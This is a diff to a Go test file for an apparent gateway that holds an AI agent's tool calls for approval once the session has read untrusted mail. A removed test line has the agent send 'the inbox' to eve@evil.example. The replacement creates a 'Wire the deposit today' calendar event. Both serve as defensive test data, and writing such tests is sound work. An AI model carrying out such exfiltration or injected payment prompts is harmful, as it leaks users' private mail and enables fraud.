@@ -28,8 +28,8 @@ func TestToolsOffered(t *testing.T) {
 	slices.Sort(got)
 	// calendar_mystery is missing: it has no class, so it is not offered.
 	// inbox_search and inbox_read are missing too: inbox is ask_only, so
-	// only its send tool is offered.
-	want := []string{"ask", "calendar_create_event", "calendar_list_events", "inbox_send", "mail_search", "mail_send", "read_answer", "shady_harmless", "status"}
+	// only the tool of it that does not read is offered.
+	want := []string{"ask", "calendar_create_event", "calendar_create_reminder", "calendar_list_events", "inbox_archive", "mail_search", "read_answer", "shady_harmless", "status"}
 	if diff := cmp.Diff(want, got); diff != "" {
 		t.Errorf("tools (-want +got):\n%s", diff)
 	}
@@ -58,21 +58,21 @@ func TestDirectReadContaminatesAndLaterActsAreHeld(t *testing.T) {
 	}
 
 	var held Held
-	res := call(t, cs, "mail_send", map[string]any{"to": "eve@evil.example", "body": "the inbox"}, &held)
+	res := call(t, cs, "calendar_create_event", map[string]any{"title": "Wire the deposit today", "date": "2026-10-12"}, &held)
 	if held.Status != "held" || held.Proposal == 0 || res.IsError {
 		t.Fatalf("result = %+v, text %q", held, text(res))
 	}
 	if !strings.Contains(text(res), "called mail.search") {
 		t.Errorf("held text does not cite what contaminated the session:\n%s", text(res))
 	}
-	// The whole point: the upstream never saw the send.
-	if diff := cmp.Diff([]string{`search {"query":"order"}`}, w.fakes["mail"].Seen()); diff != "" {
-		t.Errorf("mail upstream calls (-want +got):\n%s", diff)
+	// The whole point: the upstream never saw the held call.
+	if seen := w.fakes["calendar"].Seen(); len(seen) != 0 {
+		t.Errorf("the calendar upstream saw %v, want nothing", seen)
 	}
 
 	var st Status
 	call(t, cs, "status", nil, &st)
-	want := []HeldStatus{{Proposal: held.Proposal, Tool: "mail.send", Status: core.Pending}}
+	want := []HeldStatus{{Proposal: held.Proposal, Tool: "calendar.create_event", Status: core.Pending}}
 	if diff := cmp.Diff(want, st.Held); diff != "" {
 		t.Errorf("status held (-want +got):\n%s", diff)
 	}
@@ -87,10 +87,11 @@ func TestDirectReadContaminatesAndLaterActsAreHeld(t *testing.T) {
 func TestDiscardedResultTellsTheCallerNothing(t *testing.T) {
 	w := newWorld(t)
 	cs := w.agent("chief")
-	// The fake replies "sent". The caller must not see even that.
-	res := call(t, cs, "mail_send", map[string]any{"to": "a@example.com"}, nil)
-	if res.IsError || text(res) != "mail.send ran." {
-		t.Errorf("mail_send = %q (error %v)", text(res), res.IsError)
+	// The fake replies with the new reminder's id. The caller must not
+	// see even that.
+	res := call(t, cs, "calendar_create_reminder", map[string]any{"title": "Blanket arrives", "due": "2026-10-14"}, nil)
+	if res.IsError || text(res) != "calendar.create_reminder ran." {
+		t.Errorf("calendar_create_reminder = %q (error %v)", text(res), res.IsError)
 	}
 	if got := w.labels("chief"); got != (core.Labels{}) {
 		t.Errorf("labels = %v, want clean", got)
